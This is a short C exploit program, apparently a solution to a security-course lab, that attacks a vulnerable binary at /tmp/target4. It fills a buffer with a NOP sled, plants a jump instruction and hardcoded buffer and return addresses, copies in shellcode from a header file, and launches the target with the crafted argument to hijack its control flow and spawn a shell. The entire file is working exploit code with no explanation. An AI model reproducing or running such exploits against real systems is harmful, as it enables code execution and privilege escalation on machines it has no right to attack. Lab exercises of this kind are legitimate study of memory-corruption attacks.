#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"

#define TARGET "/tmp/target4"

int main(void)
{
  char sploit[1024];
  memset(sploit, '\x90', sizeof(sploit));
  sploit[sizeof(sploit)-1] = '\0';
  int buf_addr = 0x0804a068;
  int ret_addr = 0xbffffa70;

  *(int*)(sploit+512-8) = buf_addr;
  *(int*)(sploit+512-4) = ret_addr;
  *(int*)(sploit) = 0xffff06eb;
  *(int*)(sploit+4) = 0xffffffff;
  memcpy(sploit+10, shellcode, sizeof(shellcode)-1);

  char *args[] = { TARGET, sploit, NULL };
  char *env[] = { NULL };

  execve(TARGET, args, env);
  fprintf(stderr, "execve failed.\n");

  return 0;
}
